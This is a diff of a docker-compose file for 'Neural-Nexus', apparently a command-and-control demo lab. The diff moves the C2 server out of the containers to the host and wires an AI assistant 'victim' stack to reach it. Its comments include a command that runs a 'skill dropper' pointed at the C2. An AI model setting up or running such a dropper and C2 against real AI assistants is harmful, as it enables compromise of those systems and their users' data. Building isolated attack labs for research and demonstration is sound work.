@@ -1,29 +1,27 @@
 version: "3.9"
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  Neural-Nexus — Unified Demo Compose
+#  Neural-Nexus — Victim Stack Compose
+#
+#  The C2 server runs LOCALLY on the host (see start-demo.sh).
+#  Only the victim-side services run here, isolated on nn-demo-net.
 #
 #  Network topology (nn-demo-net  172.30.0.0/24):
 #
-#    172.30.0.2   nn-c2           Neural-Nexus C2 server (operator UI)
+#    172.30.0.1   gateway / host  ← C2 reachable here from inside containers
 #    172.30.0.10  nn-victim-lab   CorpAI Assistant (RAG + JWT RBAC)
-#    172.30.0.11  nn-victim-llm   Ollama LLM backend for the victim lab
+#    172.30.0.11  nn-victim-llm   Ollama LLM backend
 #
 #  Host ports:
-#    5001  →  C2 operator UI        (http://localhost:5001)
 #    8080  →  Victim AI assistant   (http://localhost:8080)
-#    11434 →  Ollama API (optional)
+#    11434 →  Ollama API (optional, for direct inspection)
 #
-#  Skill dropper — victim side:
-#    python victim-lab/skill/neural_nexus_skill.py --c2 http://172.30.0.2:5000
-#    (from within nn-demo-net) or
+#  Skill dropper from the host:
 #    python victim-lab/skill/neural_nexus_skill.py --c2 http://localhost:5001
-#    (from the host)
 #
-#  Usage:
-#    docker compose up --build            # full stack
-#    docker compose up c2                 # only C2
-#    docker compose logs -f nn-c2         # follow C2 logs
+#  Usage (prefer start-demo.sh which also starts the local C2):
+#    docker compose up --build
+#    docker compose logs -f nn-victim-lab
 # ─────────────────────────────────────────────────────────────────────────────
 
 networks:
@@ -38,31 +36,6 @@ networks:
 
 services:
 
-  # ── Neural-Nexus C2 ─────────────────────────────────────────────────────────
-  c2:
-    build:
-      context: ./server
-      dockerfile: Dockerfile
-    image: nn-c2:latest
-    container_name: nn-c2
-    hostname: nn-c2
-    restart: unless-stopped
-    networks:
-      nn-demo-net:
-        ipv4_address: 172.30.0.2
-    ports:
-      - "5001:5000"   # operator UI accessible at http://localhost:5001
-    environment:
-      - PORT=5000
-      - DEBUG=false
-    volumes:
-      # Persist agent data and logs across restarts
-      - c2_data:/app/data
-      - ./server/config.json:/app/config.json:ro
-    labels:
-      nn.role: "c2"
-      nn.ip: "172.30.0.2"
-
   # ── Victim LLM backend (Ollama) ─────────────────────────────────────────────
   victim-llm:
     image: ollama/ollama:latest
@@ -73,11 +46,14 @@ services:
       nn-demo-net:
         ipv4_address: 172.30.0.11
     ports:
-      - "11434:11434"   # expose for direct inspection / Falcon telemetry
+      - "11434:11434"
     volumes:
       - ollama_data:/root/.ollama
     environment:
       - OLLAMA_KEEP_ALIVE=10m
+    # Allows containers to reach the host C2 as host.docker.internal
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
     labels:
       nn.role: "victim-llm"
       nn.ip: "172.30.0.11"
@@ -95,24 +71,26 @@ services:
       nn-demo-net:
         ipv4_address: 172.30.0.10
     ports:
-      - "8080:8080"   # victim web UI accessible at http://localhost:8080
+      - "8080:8080"
     environment:
       - OLLAMA_HOST=http://172.30.0.11:11434
       - OLLAMA_MODEL=llama3
       - LAB_ID=victim-corp-01
       - JWT_SECRET_KEY=change-this-in-production
       - PORT=8080
-      # C2 address for the skill dropper hint
-      - NN_C2=http://172.30.0.2:5000
+      # Skill dropper points to host C2 via gateway (172.30.0.1) or host.docker.internal
+      - NN_C2=http://host.docker.internal:5001
     volumes:
       - ./victim-lab/frontend:/frontend:ro
       - ./victim-lab/skill:/skill:ro
     depends_on:
       - victim-llm
+    # Allows victim-lab to reach the host C2 as host.docker.internal
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
     labels:
       nn.role: "victim-lab"
       nn.ip: "172.30.0.10"
 
 volumes:
   ollama_data:
-  c2_data:
